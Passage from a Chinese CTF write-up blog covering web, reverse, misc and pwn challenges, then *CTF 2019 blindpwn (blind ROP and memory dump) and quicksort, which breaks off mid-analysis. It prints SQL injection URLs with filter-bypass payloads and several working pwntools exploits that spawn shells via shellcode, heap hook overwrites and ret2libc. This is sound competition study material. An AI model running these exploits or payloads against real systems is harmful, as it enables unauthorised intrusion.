123456http://10.21.13.190:23579/youseesee.php?id=1%27%29anandd%271%27%3D%271%27%23http://10.21.13.190:23579/youseesee.php?id=1%27)%a0oorrder%a0by%a03%23http://10.21.13.190:23579/youseesee.php?id=7%27)%a0uniounionn%a0seleselectct%a01,1,database()%23http://10.21.13.190:23579/youseesee.php?id=7%27)%a0uniounionn%a0seleselectct%a01,1,group_concat(table_name)%a0from%a0infoorrmation_schema.tables%a0where%a0table_schema=database()%23http://10.21.13.190:23579/youseesee.php?id=7%27)%a0uniounionn%a0seleselectct%a01,1,group_concat(column_name)%a0from%a0infoorrmation_schema.columns%a0where%a0table_schema=database()anandd%a0table_name=&apos;N0_Ga3E_N0_1ife&apos;%23http://10.21.13.190:23579/youseesee.php?id=7%27)%a0uniounionn%a0seleselectct%a01,1,group_concat(0ne9unch3an)%a0from%a0N0_Ga3E_N0_1ife%23 ReClickVB 程序，要求点击十万次就能拿到 flag。VB 动态调起来基本都在 dll 里绕来绕去，直接用 ida。找到cmp edx, 186A0h的地方，用keypatch改成cmp edx, 10h，保存到文件之后，点十六下就能拿到 flag。 1234567891011121314.text:004139DF mov eax, 0Ah.text:004139E4 mov ecx, 80020004h.text:004139E9 mov [ebp+var_FF0], eax.text:004139EF mov [ebp+var_FE0], eax.text:004139F5 mov [ebp+var_FD0], eax.text:004139FB mov eax, [ebp+var_B4C].text:00413A01 mov [ebp+var_FE8], ecx.text:00413A07 mov [ebp+var_FD8], ecx.text:00413A0D mov [ebp+var_FC8], ecx.text:00413A13 lea edx, [ebp+var_1000].text:00413A19 lea ecx, [ebp+var_FC0].text:00413A1F mov [ebp+var_FF8], eax.text:00413A25 mov [ebp+var_1000], 8.text:00413A2F call ds:__vbaVarDup 或者在代码段可以看到mov eax, [ebp+var_B4C]，在那堆字符串里找到对应的 flag： 123.text:004121DD mov edx, offset aFlagIMJessicaB ; &quot;flag&#123;I&apos;m Jessica Banks&#125;&quot;.text:004121E2 lea ecx, [ebp+var_B4C].text:004121E8 call esi ; __vbaStrCopy 试了一下把每点一次的次数改大一点，发现不可能点出来。因为次数用的是有符号 int 存的，最大也就 32767，再大就变成负数-32767 了。 Message-Digestupx -d脱一下壳，gdb 调一下就大概知道是怎么回事了。直接爆破： 123456789#!/usr/bin/env pythonimport hashliblength = 6for i in range(100000, 1000000): res = hashlib.md5(str(i) + 're200').hexdigest().upper() print res if res == '6941162AC29D59EBC6C3737D296359B2': print i, 'Success!' break POKPOK网上整一个满级号存档，然后金手指直接跳到打五大天王，打通后找到 flag。 或者直接用Advance Map查看地图就能找到 flag。 COFFEEjadx反编译一下发现是在 native 层进行了加密。反编译一下资源里的.so文件。 看到 data 段给了一半被加密了的 flag，然后将输入的信息和前 16 位异或之后得到正确的 flag。 然后中间还有一个对输入的 check，正确的输入经过一个encrypt函数加密后得到的内容与 data 段中给出的另一段密文相等。加密函数如下： 1234567891011121314151617181920212223242526272829303132333435363738int __fastcall encrypt(const unsigned __int8 *key, unsigned __int8 *buf, int num_2)&#123; unsigned int v4; // [sp+Ch] [bp-3Ch] unsigned int v5; // [sp+10h] [bp-38h] unsigned int v6; // [sp+14h] [bp-34h] unsigned int v7; // [sp+18h] [bp-30h] unsigned int j; // [sp+20h] [bp-28h] unsigned int i; // [sp+24h] [bp-24h] int v10; // [sp+28h] [bp-20h] unsigned int v11; // [sp+2Ch] [bp-1Ch] unsigned int v12; // [sp+30h] [bp-18h] v7 = bswap32(*(_DWORD *)key); v6 = bswap32(*((_DWORD *)key + 1)); v5 = bswap32(*((_DWORD *)key + 2)); v4 = bswap32(*((_DWORD *)key + 3)); for ( i = 0; i &lt; num_2; ++i ) &#123; v10 = 0; v12 = bswap32(*(_DWORD *)&amp;buf[8 * i]); v11 = bswap32(*(_DWORD *)&amp;buf[8 * i + 4]); for ( j = 0; j &lt;= 0x1F; ++j ) &#123; v10 -= 0x61C88647; v12 += (v6 + (v11 &gt;&gt; 5)) ^ (v7 + 16 * v11) ^ (v10 + v11); v11 += (v4 + (v12 &gt;&gt; 5)) ^ (v5 + 16 * v12) ^ (v10 + v12); &#125; buf[8 * i] = HIBYTE(v12); buf[8 * i + 1] = BYTE2(v12); buf[8 * i + 2] = BYTE1(v12); buf[8 * i + 3] = v12; buf[8 * i + 4] = HIBYTE(v11); buf[8 * i + 5] = BYTE2(v11); buf[8 * i + 6] = BYTE1(v11); buf[8 * i + 7] = v11; &#125; return 0;&#125; 加密函数中，v10显然是个常数，每一轮的值是固定的，而v11和v12也只是被之前得到的数值进行了加减操作，显然是可逆的。最需要注意的就是大小端。Solve： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778#!/usr/bin/env pythonenc = [0x3C, 0x26, 0x26, 0x34, 0x2E, 0x0F, 0x31, 0x32, 0x6E, 0x20, 0x73, 0x2B, 0x34, 0x3C, 0x20, 0x4A, 0x20, 0x53, 0x4F, 0x4D, 0x45, 0x20, 0x54, 0x45, 0x41, 0x21, 0x7D]key = [0x00, 0x01, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09, 0x0A, 0x0B, 0x0C, 0x0D, 0x0E, 0x0F, 0x00]buf = [0xAB, 0x7D, 0x9A, 0xF9, 0x72, 0x86, 0x55, 0xF6, 0x8F, 0xBC, 0x39, 0x58, 0x28, 0x88, 0xD8, 0x09]flag = ''def pack(array): if len(array) != 4: print '[*] Length is not correct!' else: res = 0 for i in range(3, -1, -1): res += array[i] res = res * 0x100 return res / 0x100def unpack(dword): res = [] for i in range(4): t = dword &amp; 0xff dword &gt;&gt;= 8 res.append(t) res = res[::-1] return res#print hex(pack([0x12, 0x34, 0x56, 0x78]))#t = unpack(0x12345678)#print t#for x in t:# print hex(x)def decrypt(key, buf, num=2): print 'Decryption:' v7 = pack(key[0:4][::-1]) print hex(v7) v6 = pack(key[4:8][::-1]) print hex(v6) v5 = pack(key[8:12][::-1]) print hex(v5) v4 = pack(key[12:16][::-1]) print hex(v4) print 'encrypt:', for x in buf: print hex(x), print res = [] for i in range(2): v11 = pack(buf[8*(1-i)+4:8*(1-i)+8][::-1]) v12 = pack(buf[8*(1-i):8*(1-i)+4][::-1]) print 'v11:', hex(v11) print 'v12:', hex(v12) v10 = 0xc6ef3720 for j in range(0x20): v11 -= (v4 + (v12 &gt;&gt; 5)) ^ (v5 + 16 * v12) ^ (v10 + v12) v11 = v11 &amp; 0xFFFFFFFF v12 -= (v6 + (v11 &gt;&gt; 5)) ^ (v7 + 16 * v11) ^ (v10 + v11) v12 = v12 &amp; 0xFFFFFFFF v10 += 0x61C88647 v10 = v10 &amp; 0xFFFFFFFF# print 'Round', 0x20-j, 'v11:', hex(v11), 'v12:', hex(v12) print 'Origin v11:', hex(v11) res.extend(unpack(v11)[::-1]) print 'Origin v12:', hex(v12) res.extend(unpack(v12)[::-1]) res = res[::-1] print 'plain:', for x in res: print hex(x), print return resprint '----------HERE ARE THE RESULT----------'res = decrypt(key, buf)for i in range(16): flag += chr(enc[i] ^ res[i])for i in range(16, len(enc)): flag += chr(enc[i])print 'flag ==&gt;', flag 其实根据encrypt函数中v10减去的值可以判断出加密算法是 TEA，被魔改成了两轮加密。 MiscSign_in复制粘贴 flag。 Differ通过判断文件的 md5 值来 diff： 1234567891011121314151617#!/usr/bin/env pythonimport hashlibdiff = []flag = ''for i in range(100, 1000): name = str(i) + '.txt' f = open(name, 'rb') content = f.read() f.close() t = hashlib.md5(content).digest().encode('hex') if t in diff: print name, t, 'is in diff' diff.append(t) # dbfe6da0f40487d84dbc2b139f727a31 if t == 'dbfe6da0f40487d84dbc2b139f727a31': print name flag += str(i)print flag PACMAN反编译一下在MainLoop函数里找到 flag： 12345678910111213141516171819202122232425262728293031323334353637int MainLoop()&#123; signed int i; // [rsp+Ch] [rbp-4h] DrawWindow(); wrefresh(win); wrefresh(status); usleep(0xF4240u); do &#123; MovePacman(1000000LL); DrawWindow(); CheckCollision(); MoveGhosts(); DrawWindow(); CheckCollision(); if ( Points &gt; FreeLife ) &#123; ++Lives; FreeLife *= 2; &#125; Delay(); &#125; while ( Food &gt; 0 ); if ( Points &gt; 333 ) &#123; mytmp = 'f21&#123;USJZ'; qword_205EA8 = 'c5ec16fb'; qword_205EB0 = '&#125;c55fbc9'; byte_205EB8 = 0; for ( i = 5; i &lt;= 22; ++i ) --*((_BYTE *)&amp;mytmp + i); pat = (char *)&amp;mytmp; &#125; DrawWindow(); return usleep(0xF4240u);&#125; AlphaStop模仿棋，破解的方法： Solve： 1234567891011121314151617181920212223242526#!/usr/bin/env pythonfrom pwn import *# context.log_level = 'debug'p = remote('10.21.13.190', 2604)ins = ['J11', 'I11', 'I10', 'I9', 'J8', 'K8', 'L9', 'L10', 'L11', 'K12']for x in ins: p.sendline(x)for i in range(1, 20): for j in range(13, 20): x = chr(ord('A') - 1 + j) x = x + str(i) p.sendline(x)for i in range(1, 9): p.sendline('L' + str(i))for i in range(12, 20): p.sendline('L' + str(i))for i in range(1, 8): p.sendline('K' + str(i))for i in range(13, 20): p.sendline('K' + str(i))for i in range(1, 8): p.sendline('J' + str(i))p.sendline('K9')p.sendline('K10')p.recv()p.interactive() Blue_Whale1234567891011121314$ docker pull n132/blue_whale:Blue_WhaleBlue_Whale: Pulling from n132/blue_whale7e6591854262: Pull complete089d60cb4e0a: Pull complete9c461696bc09: Pull complete45085432511a: Pull complete8aa06b945196: Pull completeDigest: sha256:8087896e15320744a841504f98936c90d29fbdb590a4940fdd0708a053570cabStatus: Downloaded newer image for n132/blue_whale:Blue_Whale$ docker run -it n132/blue_whale:Blue_Whale /bin/bashroot@46298885a759:/# find / -name &quot;fl4g&quot;/lib/x86_64-linux-gnu/fl4groot@46298885a759:/# cat /lib/x86_64-linux-gnu/fl4gZJGSUCTF&#123;0fbaed8d210a7a0480220a5c803d8435&#125; PwnMos1234567891011root@ed82d9634ea6:~/tmp# checksec ./main[*] &apos;/root/tmp/main&apos; Arch: amd64-64-little RELRO: Partial RELRO Stack: No canary found NX: NX disabled PIE: No PIE (0x400000) RWX: Has RWX segmentsroot@ed82d9634ea6:~/tmp# ./main123Magic Adress ===&gt;&gt;&gt;0x7ffd7ac7ab60 障眼法。。。最近好久题目做太少了完全没想到 shellcode，明明是一道送分题，心累。Exploit： 123456789101112131415161718192021222324252627282930#!/usr/bin/env pythonfrom pwn import *context.log_level = 'debug'context.terminal = ['tmux', 'sp', '-h']context.arch = 'amd64'local = 0if local: p = process('./main')else: p = remote('10.21.13.190', 2600)# gdb.attach(p)main = 0x400566csu_end_addr = 0x40060acsu_front_addr = 0x4005f0buf = 0x00601000 + 0x100offset = 24payload = 'A' * offset + p64(csu_end_addr) + p64(0) + p64(1) + p64(read_got) + p64(0x400) + p64(buf) + p64(0) + p64(csu_front_addr) + '\\x00' * 56 + p64(buf)p.send(payload)payload = asm(''' mov rax, 59 mov rsi, 0 mov rdx, 0 mov rdi, 0x68732f6e69622f push rdi mov rdi, rsp syscall''')p.send(payload)p.interactive() Time比较明显的fmtstr，一开始想到的是把system的参数改成/bin/sh，后来发现字符串存在.rodata段，是只可读的。正确的思路是利用one_gadget和system之间的比较近的原理，将system改成one_gadget。 1234567891011#!/usr/bin/env pythonfrom pwn import *# context.log_level = 'debug'elf = ELF('./main')system_got = elf.got['system']p = process('./main')payload = '%&#123;&#125;c%8$hn'.format(0x2216).ljust(0x10, '\\x00') + p64(system_got)payload = payload[:-5]p.sendafter('.\\n', payload)p.interactive() Note简单tcache，填满tcache后利用unsorted bin泄漏libc，然后用tcache dup把__free_hook改成system。Exploit： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576#!/usr/bin/env pythonfrom pwn import *context.log_level = 'debug'context.terminal = ['tmux', 'sp', '-h']local = 0if local: p = process('./note')else: p = remote('10.21.13.190', 2599)libc = ELF('./libc-2.27.so')one_gadget = [0x4f2c5, 0x4f322, 0x10a38c]# gdb.attach(p)def cmd(c): p.recvuntil('========\\n\\n') p.sendline(str(c))def add(content): cmd(1) p.recvuntil('Note&gt;\\n') p.send(content)def delete(idx): cmd(2) p.recvuntil('&gt;') p.sendline(str(idx))def show(idx): cmd(3) p.recvuntil('&gt;') p.sendline(str(idx))add('A') # 0add('B') # 1add('A') # 2add('A') # 3add('A') # 4add('A') # 5add('A') # 6add('A') # 7add('A') # 8delete(2)delete(3)delete(4)delete(5)delete(6)delete(7)delete(8)delete(0)show(0)offset = 0x7f6d1974dca0-0x7f6d19362000libc_base = u64(p.recvuntil('\\x7f')[-6:].ljust(8, '\\x00')) - offsetsuccess('libc_base = ' + hex(libc_base))one_gadget = libc_base + one_gadget[2]success('one_gadget = ' + hex(one_gadget))add('A') # 0add('A') # 2add('A') # 3add('A') # 4add('A') # 5add('A') # 6add('A') # 7add('A') # 8delete(8)delete(8)free_hook = libc_base + libc.symbols['__free_hook']add(p64(free_hook)) # 8add('A') # 9system = libc_base + libc.symbols['system']success('system = ' + hex(system))add(p64(system)) # 10# gdb.attach(p)add('/bin/sh') # 11delete(20)p.interactive() Three-bodyoff_by_one加shrink： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657#!/usr/bin/env pythonfrom pwn import *# context.log_level = 'debug'context.terminal = ['tmux', 'sp', '-h']p = process('./main')elf = ELF('./main')libc = elf.libcone_gadget_offset = 0xf02a4def cmd(c): p.sendlineafter('&gt;\\n', str(c))def add(size, c = 'A'): cmd(1) cmd(size) p.sendafter('&gt;\\n', c)def free(idx): cmd(2) p.sendlineafter('&gt;', str(idx))def show(idx): cmd(3) p.sendlineafter('&gt;', str(idx))def edit(idx, c): cmd(4) p.sendlineafter('&gt;', str(idx)) p.sendafter('&gt;', c)add(0x88) # 0add(0x18, 'A' * 0x18) # 1free(0)add(0x88) # 0add(0x68, p64(0x21) * 13) # 2show(0)libc_base = u64(p.readline()[:-1].ljust(8, '\\x00')) - (0x7ffff7dd1b41 - 0x7ffff7a0d000)log.info(hex(libc_base))free(0)add(0x88, 'A' * 0x88) # 0edit(0, 'A' * 0x88 + '\\x41')free(1)free(2)malloc_hook = libc_base + libc.symbols['__malloc_hook']add(0x38, p64(0) * 3 + p64(0x71) + p64(malloc_hook - 35)) # 1add(0x68) # 2free(0)free(1)one_gadget = libc_base + one_gadget_offsetlog.info(hex(one_gadget))add(0x38, '\\x00' * 0x28) # 0add(0x68, '\\x00' * 19 + p64(one_gadget)) # 1gdb.attach(p)free(2)p.interactive()","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"qianfei11.coding.me/tags/ctf/"},{"name":"wp","slug":"wp","permalink":"qianfei11.coding.me/tags/wp/"}]},{"title":"2019-Starctf-blindpwn","slug":"2019-Starctf-blindpwn","date":"2019-05-01T13:41:36.000Z","updated":"2019-08-26T01:16:21.890Z","comments":true,"path":"2019/05/01/2019-Starctf-blindpwn/","link":"","permalink":"qianfei11.coding.me/2019/05/01/2019-Starctf-blindpwn/","excerpt":"第一次盲打 pwn。","text":"第一次盲打 pwn。 Description12345678910111213141516Close your eyes!$ nc 34.92.37.22 10000checksec:Arch: amd64-64-littleRELRO: Partial RELROStack: No canary foundNX: NX enabledPIE: No PIE (0x400000)file libc:libc-2.23.so: ELF 64-bit LSB shared object,x86-64, version 1 (GNU/Linux), dynamicallylinked, interpreter /lib64/ld-linux-x86-64.so.2,BuildID[sha1]=b5381a457906d279073822a5ceb2 Analysis试了一下格式化字符串无果，猜测是栈溢出。尝试爆破溢出的长度，检测脚本： 12345678910def find_offset(): for i in range(1, 500): try: p = remote('34.92.37.22', 10000) p.sendafter('!\\n', 'A' * i) p.recv() p.close() except EOFError: success('Founded! offset = ' + hex(i - 1)) break 判断出溢出的偏移之后，接下来就是要找 gadget。先尝试自己编译一个类似的程序（gcc test.c -o test -fno-stack-protector）： 123456789101112131415#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;void vul() &#123; char buf[0x20]; puts(\"Welcome!\"); read(0, buf, 0x100); puts(\"Goodbye!\");&#125;int main() &#123; setvbuf(stdin, 0, 2, 0); setvbuf(stdout, 0, 2, 0); vul();&#125; 用objdump看反汇编基本可以知道.text段是从0x400500开始，到将近0x400800结束。我们要的通用 gadget 在__libc_csu_init中，就直接尝试从0x400600开始爆破： 12345678910111213141516171819def get_stop_gadget(offset): stop_gadget = 0x400000 + 0x600 stop_gadget_list = [] while True: if stop_gadget &gt; 0x400800: return stop_gadget_list try: p = remote('34.92.37.22', 10000) payload = 'A' * offset + p64(stop_gadget) p.sendafter('pwn!\\n', payload) p.recv() p.close() success('Founded! stop_gadget = ' + hex(stop_gadget)) stop_gadget_list.append(stop_gadget) stop_gadget = stop_gadget + 1 except Exception: stop_gadget = stop_gadget + 1 p.close()# [0x4006ce, 0x4006cf, 0x4006dd, 0x4006e2, 0x4006e7, 0x4006ec, 0x4006f1, 0x4006f6, 0x400705, 0x40070a, 0x40070f, 0x400714, 0x400776] 拿到了一堆地址，跟据返回地址可以判断第一个肯定是函数开始的地址。后面的应该都是函数中的地址。在一个地址可以看到很多奇怪的输出： 1234567891011121314151617181920212223242526272829[DEBUG] Received 0x1b bytes: &apos;Welcome to this blind pwn!\\n&apos;[DEBUG] Sent 0x30 bytes: 00000000 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 41 │AAAA│AAAA│AAAA│AAAA│ * 00000020 41 41 41 41 41 41 41 41 ec 06 40 00 00 00 00 00 │AAAA│AAAA│··@·│····│ 00000030[*] Switching to interactive mode[DEBUG] Received 0x100 bytes: 00000000 57 65 6c 63 6f 6d 65 20 74 6f 20 74 68 69 73 20 │Welc│ome │to t│his │ 00000010 62 6c 69 6e 64 20 70 77 6e 21 0a 00 47 6f 6f 64 │blin│d pw│n!··│Good│ 00000020 62 79 65 21 0a 00 00 00 01 1b 03 3b 40 00 00 00 │bye!│····│···;│@···│ 00000030 07 00 00 00 44 fd ff ff 8c 00 00 00 a4 fd ff ff │····│D···│····│····│ 00000040 5c 00 00 00 9a fe ff ff b4 00 00 00 bf fe ff ff │\\···│····│····│····│ 00000050 d4 00 00 00 02 ff ff ff f4 00 00 00 54 ff ff ff │····│····│····│T···│ 00000060 14 01 00 00 c4 ff ff ff 5c 01 00 00 14 00 00 00 │····│····│\\···│····│ 00000070 00 00 00 00 01 7a 52 00 01 78 10 01 1b 0c 07 08 │····│·zR·│·x··│····│ 00000080 90 01 07 10 14 00 00 00 1c 00 00 00 40 fd ff ff │····│····│····│@···│ 00000090 2a 00 00 00 00 00 00 00 00 00 00 00 14 00 00 00 │*···│····│····│····│ 000000a0 00 00 00 00 01 7a 52 00 01 78 10 01 1b 0c 07 08 │····│·zR·│·x··│····│ 000000b0 90 01 00 00 24 00 00 00 1c 00 00 00 b0 fc ff ff │····│$···│····│····│ 000000c0 50 00 00 00 00 0e 10 46 0e 18 4a 0f 0b 77 08 80 │P···│···F│··J·│·w··│ 000000d0 00 3f 1a 3b 2a 33 24 22 00 00 00 00 1c 00 00 00 │·?·;│*3$&quot;│····│····│ 000000e0 44 00 00 00 de fd ff ff 25 00 00 00 00 41 0e 10 │D···│····│%···│·A··│ 000000f0 86 02 43 0d 06 60 0c 07 08 00 00 00 1c 00 00 00 │··C·│·`··│····│····│ 00000100Welcome to this blind pwn!\\x00Goodbye!\\x00\\x00\\x00\\x1b\\x03;@\\x00\\x00\\x00\\x07\\x00\\x00\\x00D????\\x00\\xa4???\\\\x00\\x9a\\xfe\\xff\\xff\\xb4\\x00\\x00\\x00\\xbf\\xfe\\xff\\xff?\\x00\\x00\\xff\\xff\\xff?T\\xff\\xff\\xff\\x14\\x00\\x00??\\xff\\xff\\\\x00\\x00\\x14\\x00\\x00\\x00\\x00\\x00\\x00\\x00zR\\x00x\\x10\\x1b\\x0c\\x0\\x90\\x07\\x10\\x14\\x00\\x00\\x00\\x1c\\x00\\x00\\x00@???*\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x14\\x00\\x00\\x00\\x00\\x00\\x00\\x00zR\\x00x\\x10\\x1b\\x0c\\x0\\x90\\x00\\x00$\\x00\\x00\\x00\\x1c\\x00\\x00\\x00\\xb0???P\\x00\\x00\\x0e\\x10F\\x0e\\x18J\\x0f\\x0b\\x80\\x00?\\x1a;*3$&quot;\\x00\\x00\\x00\\x00\\x1c\\x00\\x00\\x00D\\x00\\x00\\x00??\\xff\\xff%\\x00\\x00\\x00\\x00A\\x0e\\x10\\x86C\\x06`\\x0c\\x0\\x00\\x00\\x00\\x1c\\x00\\x00\\x00$ 发生了这种情况，基本可以排除输出函数是puts还有printf的可能了，因为只有可能是write在参数发生错误的时候会输出不一样长度的内容（后来出题人说是因为忘记清空寄存器了）。这里也出现了一个非预期解，因为这个地方直接泄漏了 libc 上的值。放一下 exp： 1234567891011121314p = remote('34.92.37.22', 10000)payload = 'A' * offset + p64(stop_gadget_list[7])p.recvuntil('!\\n')p.sendline(payload)libc_start_main = u64(p.recv()[0x48:0x48+8].ljust(8, '\\x00')) - 240success('libc_start_main = ' + hex(libc_start_main))libc_base = libc_start_main - 0x20740success('libc_base = ' + hex(libc_base))one_gadget_offset = [0x45216, 0x4526a, 0xf02a4, 0xf1147]one_gadget = libc_base + one_gadget_offset[0]success('one_gadget = ' + hex(one_gadget))payload = 'A' * offset + p64(one_gadget)p.sendline(payload)p.interactive() 下面还是记录一般 brop 中 dump 内存的方法。 基本判断出是write了之后，可以再定位一下call write的地址，手工枚举一下附近的几个地址： 123456789$ python -c &quot;import sys; sys.stdout.write(&apos;a&apos;*0x28+&apos;\\x14\\x07\\x40&apos;)&quot; | nc 34.92.37.22 10000 # # #### ##### ###### # # # # # #### ### # # ##### # # # # # # # # # # # #### # #Welcome to this blind pwn!aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa@F1? @0?;?F1????;?@|??V??p@F1?|??Z???&#125;|???^&#125;(F1?h??;?ۇ?;?p@F1?% 看到直接把我们输入的字符串以及后面的一些东西输出来了，那说明没有传参直接 call 了write。 接下来我们最需要的是在__libc_csu_init中的 gadgets，想办法爆破出这个地址： 12345678910111213141516171819def get_brop_gadget(offset, stop_gadget): brop_gadget = 0x400600 brop_gadget_list = [] while True: if brop_gadget &gt; 0x400800: return brop_gadget_list p = remote('34.92.37.22', 10000) payload = 'A' * offset + p64(brop_gadget) + p64(0) * 6 + p64(stop_gadget) p.sendafter('pwn!\\n', payload) try: p.recvuntil('pwn!\\n') except: p.close() else: success('Founded!' + hex(brop_gadget)) brop_gadget_list.append(brop_gadget) p.close() brop_gadget = brop_gadget + 1# [0x4006ce, 0x4006cf, 0x4006dd, 0x4006e2, 0x4006e7, 0x4006ec, 0x400776] 最后一个地址显然和之前不一样，可以判断出是__libc_csu_init上的 gadgets。然后根据偏移可以得到几条关键指令的地址，也就得到了我们的通用 gadgets： 1234567891011121314151617.text:0000000000400700 mov rdx, r13.text:0000000000400703 mov rsi, r14.text:0000000000400706 mov edi, r15d.text:0000000000400709 call qword ptr [r12+rbx*8].text:000000000040070D add rbx, 1.text:0000000000400711 cmp rbx, rbp.text:0000000000400714 jnz short loc_400700.text:0000000000400716.text:0000000000400716 loc_400716: ; CODE XREF: __libc_csu_init+34↑j.text:0000000000400716 add rsp, 8.text:000000000040071A pop rbx.text:000000000040071B pop rbp.text:000000000040071C pop r12.text:000000000040071E pop r13.text:0000000000400720 pop r14.text:0000000000400722 pop r15.text:0000000000400724 retn 拿到了通用 gadget，同时利用前面得到的call write，我们可以把整个 binary 直接 dump 下来： 1234567891011def leak(start, length): elf = '' for i in range((length + 0xff) / 0x100): p = remote('34.92.37.22', 10000) payload = ('A' * offset + p64(pop_rdi_ret) + p64(1) + p64(pop_rsi_r15_ret) + p64(start + i * 0x100) + p64(0) + p64(call_write)).ljust(0x80, 'A') print repr(payload) print len(payload) p.sendafter('pwn!\\n', payload) elf += p.recv(0x100) p.close() return elf 拿到程序之后，在 ida 里可以查到write的plt和got，接下来就是泄漏然后get shell了。： 1234LOAD:0000000000400520 sub_400520 proc near ; CODE XREF: sub_4006CE+28↓pLOAD:0000000000400520 ; sub_4006CE+46↓pLOAD:0000000000400520 jmp cs:qword_601018LOAD:0000000000400520 sub_400520 endp Exploit12345678910111213141516# start attackp = remote('34.92.37.22', 10000)write_plt = 0x400520write_got = 0x601018payload = 'A' * offset + p64(pop_rdi_ret) + p64(1) + p64(pop_rsi_r15_ret) + p64(write_got) + p64(0) + p64(write_plt) + p64(main)p.sendafter('pwn!\\n', payload)write = u64(p.recvuntil('\\x7f').ljust(8, '\\x00'))success('write = ' + hex(write))libc_base = write - 0x0f72b0success('libc_base = ' + hex(libc_base))# get shellsystem = libc_base + 0x045390str_bin_sh = libc_base + 0x18cd57payload = 'A' * offset + p64(pop_rdi_ret) + p64(str_bin_sh) + p64(system)p.sendafter('pwn!\\n', payload)p.interactive() Referenceshttps://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/medium-rop/#_12https://n132.github.io/2019/04/29/2019-04-29-Starctf2019-Blindpwn/http://shift-crops.hatenablog.com/entry/2019/04/30/131154#blindpwn-Pwn-303pt-47-solveshttps://balsn.tw/ctf_writeup/20190427-*ctf/#blindpwnhttps://github.com/sixstars/starctf2019/blob/master/pwn-blindpwn","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"qianfei11.coding.me/tags/ctf/"},{"name":"wp","slug":"wp","permalink":"qianfei11.coding.me/tags/wp/"},{"name":"pwn","slug":"pwn","permalink":"qianfei11.coding.me/tags/pwn/"}]},{"title":"2019-Starctf-quicksort","slug":"2019-Starctf-quicksort","date":"2019-04-29T10:15:42.000Z","updated":"2019-08-26T01:16:16.019Z","comments":true,"path":"2019/04/29/2019-Starctf-quicksort/","link":"","permalink":"qianfei11.coding.me/2019/04/29/2019-Starctf-quicksort/","excerpt":"略有点脑洞的 Got hijack。","text":"略有点脑洞的 Got hijack。 记录一下国际大赛上做出的第一道 pwn 题。 Checksec1234567root@aa922ef5677a:~/tmp# checksec ./quicksort[*] '/root/tmp/quicksort' Arch: i386-32-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: No PIE (0x8048000) Analysis1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162unsigned int func()&#123; char *num; // ebx char s; // [esp+Ch] [ebp-2Ch] char v3; // [esp+Dh] [ebp-2Bh] char v4; // [esp+Eh] [ebp-2Ah] char v5; // [esp+Fh] [ebp-29h] char v6; // [esp+10h] [ebp-28h] char v7; // [esp+11h] [ebp-27h] char v8; // [esp+12h] [ebp-26h] char v9; // [esp+13h] [ebp-25h] char v10; // [esp+14h] [ebp-24h] char v11; // [esp+15h] [ebp-23h] char v12; // [esp+16h] [ebp-22h] char v13; // [esp+17h] [ebp-21h] char v14; // [esp+18h] [ebp-20h] char v15; // [esp+19h] [ebp-1Fh] char v16; // [esp+1Ah] [ebp-1Eh] char v17; // [esp+1Bh] [ebp-1Dh] int sum; // [esp+1Ch] [ebp-1Ch] int i; // [esp+20h] [ebp-18h] int j; // [esp+24h] [ebp-14h] char *ptr; // [esp+28h] [ebp-10h] unsigned int v22; // [esp+2Ch] [ebp-Ch] v22 = __readgsdword(0x14u); v3 = 0; v4 = 0; v5 = 0; v6 = 0; v7 = 0; v8 = 0; v9 = 0; v10 = 0; v11 = 0; v12 = 0; v13 = 0; v14 = 0; v15 = 0; v16 = 0; v17 = 0; s = 0; sum = 0; puts(\"how many numbers do you want to sort?\"); __isoc99_scanf(\"%d\", &amp;sum); getchar(); ptr = (char *)malloc(4 * sum); for ( i = 0; i &lt; sum; ++i ) &#123; printf(\"the %dth number:\", i + 1); gets(&amp;s); num = &amp;ptr[4 * i]; *(_DWORD *)num = atoi(&amp;s); &#125; quicksort((int)ptr, 0, sum - 1); puts(\"Here is the result:\"); for ( j = 0; j &lt; sum; ++j ) printf(\"%d \", *(_DWORD *)&amp;ptr[4 * j]); puts(&amp;byte_8048AD2); free(ptr); return __readgsdword(0x14u) ^ v22;&#125; 程序要求输入一个数字 sum，然后再输入 sum 个数字，最后对这些数字快排之后得到结果。 这里漏洞很明显是有一个gets，然而显然做不到直接 rop。在调试一段时间之后，发现了一个任意地址写的地方： 123456789101112131415161718192021assassinq&gt;&gt; stack 200000| 0xffe85300 --&gt; 0xffe8531c --&gt; 0x00004| 0xffe85304 --&gt; 0x10008| 0xffe85308 --&gt; 0xffe85348 --&gt; 0xffe85358 --&gt; 0x00012| 0xffe8530c --&gt; 0x80488c5 (mov eax,DWORD PTR [ebp-0x1c])0016| 0xffe85310 --&gt; 0xffe85348 --&gt; 0xffe85358 --&gt; 0x00020| 0xffe85314 --&gt; 0xf77b8010 (&lt;_dl_runtime_resolve+16&gt;: pop edx)0024| 0xffe85318 --&gt; 0xf7782864 --&gt; 0x00028| 0xffe8531c --&gt; 0x00032| 0xffe85320 --&gt; 0x00036| 0xffe85324 --&gt; 0x00040| 0xffe85328 --&gt; 0x00044| 0xffe8532c --&gt; 0x20048| 0xffe85330 --&gt; 0x00052| 0xffe85334 --&gt; 0x00056| 0xffe85338 --&gt; 0x83d0008 --&gt; 0x00060| 0xffe8533c --&gt; 0x9838e2000064| 0xffe85340 --&gt; 0x10068| 0xffe85344 --&gt; 0x00072| 0xffe85348 --&gt; 0xffe85358 --&gt; 0x00076| 0xffe8534c --&gt; 0x80489e4 (mov eax,0x0) 在读取数字的gets这里停下，查看栈的情况。这里的0x83d0008是程序中的ptr，然后程序会将我们输入的字符串atoi之后，赋给ptr指向的地址。在中间还有一个地址存放剩余循环的次数。我们可以通过缓冲区溢出，一开始的数字为我们想要修改的内容，中间存放剩余循环次数，最后放我们要写的地址，就达到了任意地址写的目的。而canary又在下面，不会受到影响。 接下来就需要想办法泄漏，n132 